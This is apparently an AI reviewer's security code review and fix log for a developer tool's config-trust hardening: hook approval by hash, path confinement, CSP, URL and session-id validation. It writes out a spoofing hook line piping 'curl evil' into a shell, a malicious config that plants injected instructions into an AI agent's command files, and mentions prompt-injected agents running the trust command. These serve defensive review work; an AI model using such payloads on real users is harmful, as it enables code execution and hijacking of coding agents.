# N274 — Untrusted config and task data never run code — events.hooks trust, confined paths, notify, mrUrl, CSP — Review

**Reviewer:** Task Reviewer (ai) + independent correctness/security sub-review
**Date:** 2026-10-20
**PR:** (no PR yet — commit `a322667` on `chore/N271-audit-fixes`)
**Verdict:** REQUEST CHANGES (fix-needed)

## Summary

`events.hooks` shell commands now run only after `insight-flow trust-hooks` approves the project's exact hook hash — and the review confirmed the gate sits in front of the **only** `sh -c` spawn in `src/`; config paths are confined and `master.url` validated in `resolveConfig`; Langfuse never pairs a config host with env keys; Windows notify no longer interpolates; `mrUrl` is http(s)-only on write and in the UI; remote `<img>` is dropped from markdown; dashboard HTML carries a CSP + nosniff + Referrer-Policy; `/overview` escapes the master URL; session ids are sanitized. **Two defects block merge:** `insight-flow init` loads the config raw and uses `rolesDir`/`workDir` without ever calling `resolveConfig`, so the new confinement does not run on exactly the path a cloned repo would exploit; and the `trust-hooks` review print shows raw strings, so control characters can spoof what the human approves. Both are small, local fixes.

## Checklist verification

- [x] `events.hooks` run only after `trust-hooks` approved their exact hash (A13) — pass (`log-event.ts:355-369`; `trusted-hooks.ts:29-31`); caveat: the review print is spoofable (blocker 2)
- [ ] `rolesDir`/`workDir`/`activityEngine.logFile` outside the project root fail config load (A33) — PARTIAL: true for `resolveConfig` (`config.ts:84-93`, tested) but `init` loads the raw config and never runs the check (blocker 1); the error surfaces as a Node stack trace, not the "clear error" promised (non-blocking #2)
- [x] Langfuse never combines a config host with env keys (A33) — pass (`langfuse.ts:194-195`; test; mixed publicKey-config/secretKey-env also forces the env host)
- [x] Windows notify via env vars; no interpolation (A34) — pass (`notify.ts:38-44`)
- [x] `mrUrl` http(s) on write; link only for http(s) (A39) — pass (`push.ts:56-61`, the sole writer; `DetailPanel.tsx:79-87`)
- [x] Both markdown sites sanitize without remote images (A38) — pass (`sanitize.ts:10-13`; `DetailPanel.tsx:310`; `ModuleDetail.tsx:177` via `MarkdownBlock` at all four sites)
- [x] HTML responses send CSP, nosniff, Referrer-Policy (A38) — pass (`index.ts:31-48`, applied at `:978`/`:1011`/`:1665`; test)
- [x] `/overview` escapes and validates `master.url` (A78) — pass (`index.ts:997-1009`; `config.ts:94-97`)
- [x] Session ids outside `[A-Za-z0-9_-]{1,128}` never reach a path (A81) — pass (`log-event.ts:81-82`; Claude/Cursor ids are UUIDs so real sessions still match)
- [x] Quality gates — as run by the implementer (410/410 then); not re-run here

## Blockers

1. **`insight-flow init` bypasses the new path confinement** — `src/agents/init/index.ts:106-113` (raw `JSON.parse` of `taskflow.config.json` merged into `config`), used for writes at `:147` (`resolveFlowRoot(cwd, config.workDir)`), `:189-205` (`mkdirSync` + `copyFileSync` of every role template into `resolve(cwd, config.rolesDir)`), `:228` (`applyAgentExtensions` writes the config's own `agents.extend` strings into role files there), `:233`/`:238`, and `:242` `applyEnforcement(config, cwd)` → `prompt-build.ts:190-230` writes `AGENT_ENFORCEMENT.md` + `AGENT_GIT.md` into `rolesDir` and patches every `*.md` in it. `cli.ts:228-235` calls `initProject(process.cwd(), …)` without ever calling `resolveConfig()`, so `assertInside` (`config.ts:84-93`) never runs on this path. (The hub "New project" route is not affected — `master/server.ts:1222` 409s when a config already exists.)
   **Why:** attacker commits `{"rolesDir": "../../.claude/commands", "agents": {"extend": {"task-implement": ["<injected instructions>"]}}}`; the victim clones and runs `insight-flow init` (the normal "set up hooks/skills" step) → ~10 `.md` files with attacker text are written outside the repo and every existing `.md` in that directory is patched. This is the exact threat the task was about.
   **Fix (smallest):** move the `assertInside` block from `config.ts:84-93` into an exported `assertConfinedPaths(userConfig, anchor)` and call it in `init/index.ts` right after the `if (configExisted)` block (outside the parse try/catch so it is not swallowed). Add a test: `init` on a project whose config has `rolesDir: "/tmp/x"` must fail.

2. **The `trust-hooks` review print can be spoofed with control characters** — `src/cli/commands/trust-hooks.ts:313` (`console.log(\`  [${event}] ${cmd}\`)` prints the raw string).
   **Why:** JSON allows `\r`, `\n`, `\u001b`. A committed hook like `"curl evil | sh #\r  [start] echo ok              "` renders in a terminal as `  [start] echo ok`; the user approves, and the hash covers the real command — defeating the "human saw the exact commands" guarantee the gate exists for.
   **Fix:** print `JSON.stringify(cmd)` (escapes all control characters): `console.log(\`  [${event}] ${JSON.stringify(cmd)}\`)`. The hash still covers the raw string, so nothing else changes.

## Non-blocking

1. `config.ts:84-90` — `assertInside` is string-only; a symlink committed in the repo bypasses it (git checks out symlinks by default): `roles -> ../../.claude` + `rolesDir: "roles"` passes and prompt-build/init write through the link. Fix: compare `realpathSync` of the deepest existing ancestor of `resolved` against `realpathSync(anchor)`, or reject `lstatSync(resolved).isSymbolicLink()`.
2. `config.ts:88, :96` throw plain `Error`; `cli.ts:490-499` only prints `error: <msg>` for the three known error classes and re-throws everything else → a Node stack trace instead of the clear error the checklist promises. Throw `TaskflowValidationError` (`schema/index.ts:777`), as the spec said. (N278 also addresses the general case.)
3. `config.ts:87` — when the project root is the filesystem root, `anchor + sep` is `//` and every relative path is wrongly rejected. `master/server.ts:1215-1217` already handles this case; reuse that prefix normalization.
4. `config.ts:95` regex accepts `http://` alone; `index.ts:998` `new URL(safeMaster)` then throws → 500 on `/overview` (caught by the N151 boundary, no crash). Fix: `URL.canParse(masterUrl)` at config load.
5. CSP honesty: with `script-src 'unsafe-inline'` (`index.ts:35`) the CSP does **not** stop an inline-script XSS. What remains: no remote `<script src>`, `object-src 'none'`, `base-uri 'self'`, `img-src 'self' data:` (kills image beacons), `connect-src 'self'` (kills fetch/XHR/EventSource exfil), scoped `frame-src`. Not covered: `form-action` (a `<form action="https://evil">` still submits) and navigation. The real XSS defense is React escaping + rehype-sanitize (no `dangerouslySetInnerHTML` left in the client). Cheap add: `form-action 'self'`.
6. `test/config-trust.test.mjs:724-734` — `waitMarker(false)` returns true immediately when the marker does not exist yet, so the "untrusted hook did not run" assertion proves nothing against a regression that spawns the hook. Fix: `await new Promise(r => setTimeout(r, 500)); assert.equal(existsSync(marker), false)`. Also `HOME: dir` redirects `homedir()` on POSIX only; set `USERPROFILE` too for Windows.
7. Spec step 1 asked for a y/N prompt or `--yes`; only `--yes` exists (`trust-hooks.ts:316-323`). `init/index.ts:29` already has a readline pattern if parity is wanted. Acceptable as is.
8. `trusted-hooks.ts:19` comment says "array order independent" — it is not (lines 22-23 keep array order, so reordering commands needs re-approval). That is the stricter/safer behaviour; fix the comment.
9. `trust-hooks --yes` is runnable by an agent (no interactive check). This matches the locked design: the gate stops the **silent** path (clone → first `log-event`), not a prompt-injected agent explicitly told to run it. Cheap extra: one line in `AGENT_ENFORCEMENT` / the role prompts forbidding agents from running `trust-hooks`.
10. `notify.ts:26` — `notify-send` gets `title` as the first arg; a project name starting with `-` becomes an option (e.g. `--icon=…`). No exec risk; prefix with `"--"` to be tidy. osascript (`JSON.stringify` inside an execFile arg) and PowerShell (env vars) confirmed non-interpolating.
11. Spec step 5 wanted an http(s) refine on the `mrUrl` schema; not added. Acceptable because `mr-update` is the only writer (`create.ts:203` sets null; no server/MCP writer found) and a read-side refine would break loading existing tasks.

## Security & edge cases

- Verified closed: the A13 gate is in front of the ONLY `sh -c` spawn in `src/` (`log-event.ts:346-370`; the other spawns are fixed binaries); gate placement does not change dedup or the `source=hook` path. Hash key/root are consistent (`trust-hooks.ts:12` and `log-event.ts:351` both use `resolveProjectRoot()`, which strips a trailing slash); keys are sorted; the store is written atomically; there is no pre-seed path (workDir/rolesDir writers only produce fixed names). `resolveConfig`'s confinement: root-equal allowed, absolute-inside allowed, `/a/bc` vs `/a/b` guarded by `anchor + sep`, Windows uses `sep`; defaults and `master: {standalone:true}` / `master: {}` pass; all 12 `resolveConfig` callers are single-project CLI paths. Langfuse: config keys + env host works; any env-sourced key forces the env host. Sanitize: `defaultSchema.tagNames` is a flat array so filtering `img` works; `picture`/`source` can't fetch without an `img`; `video`/`object`/`embed`/`iframe`/`svg` are not in the default; react-markdown has no `rehype-raw` so raw HTML stays text; no other task field is rendered as href/src. CSP compatibility: the client has no external fonts/images, EventSource is same-origin, styled-components/Vite inline is covered by `'unsafe-inline'`, the hub proxy's injections (`__IF_BASE__` inline script, same-origin `<base>`, same-origin `/hub-notify.js`, `/sw.js`, `/events`, `/sounds/*`) are all permitted; nothing frames the dashboard so `frame-ancestors 'self'` is safe; `frame-src` is `'none'` everywhere except `/overview`, where it is exactly the master origin.
- Blocker 1 is the serious one: it leaves the task's headline threat (a cloned `taskflow.config.json`) open on the `init` path. Blocker 2 undermines the human-review guarantee of the hooks gate.

## Notes

- Fix order: blocker 1 (shared `assertConfinedPaths` + call in init + test) → blocker 2 (one-line `JSON.stringify`) → #2 (`TaskflowValidationError` for a clean message) and #6 (make the untrusted-hook test actually wait) are the valuable follow-ups; #1 (symlink realpath) is worth a line too.
- Hand-off: `/task-review-fix N274` (gated — wait for the human's go-ahead).

## Fix log (task-review-fix, 2026-10-20, Opus 4.8)

**Blocker 1 — init bypasses path confinement — FIXED.** Extracted the inline check in `resolveConfig` into an exported `assertConfinedPaths(userConfig, anchor)` (`core/config.ts`) and call it from `agents/init/index.ts` right after the config is merged, BEFORE any role/flow write. A cloned `rolesDir: "../../.claude/commands"` now aborts `init`. New test `init: a cloned config with an off-root rolesDir fails before writing`.

**Blocker 2 — trust-hooks review spoofable — FIXED** (`cli/commands/trust-hooks.ts`): the per-command print now uses `JSON.stringify(cmd)`, escaping `\r`/`\n`/`\u001b` so a committed hook can't spoof what the human approves. The hash still covers the raw string.

**Non-blocking addressed:**
- #1 symlink bypass — `assertConfinedPaths` now also compares `realpathSync` of the deepest existing ancestor against the project realpath, so a committed symlink can't escape.
- #2 clean error — `TaskflowValidationError` now accepts a plain message; confinement/url errors surface as `error: …` via cli.ts, not a stack trace.
- #3 filesystem-root project — the anchor/prefix are normalized so `anchor + sep` is never `//`.
- #4 `master.url` — now also requires `URL.canParse`, so `http://` alone (which later 500'd `/overview`) is rejected at load.
- #5 CSP — added `form-action 'self'`.
- #6 untrusted-hook test — now waits 700 ms then asserts the marker is absent (an immediate check passed vacuously); `cli()` also sets `USERPROFILE` for Windows isolation.
- #8 fixed the inaccurate `hooksHash` comment (event keys sorted; command order significant).
- #10 `notify-send` now gets `--` before the title/message.

**Non-blocking deliberately left (with reason):**
- #7 y/N interactive prompt — `--yes` only is acceptable per the locked design.
- #9 a line in AGENT_ENFORCEMENT forbidding agents from running `trust-hooks` — the generated enforcement block has byte-exact drift guards and is re-composed by N275; the value is marginal (the locked design already accepts that a prompt-injected agent explicitly told to run it can). Left to avoid churn for low value.
- #11 http(s) refine on the `mrUrl` schema — `mr-update` is the only writer; a read-side refine would break loading existing tasks.

Verified: typecheck + lint + build clean; config-trust 6/6, server-trust 11/11, init-layout 3/3.
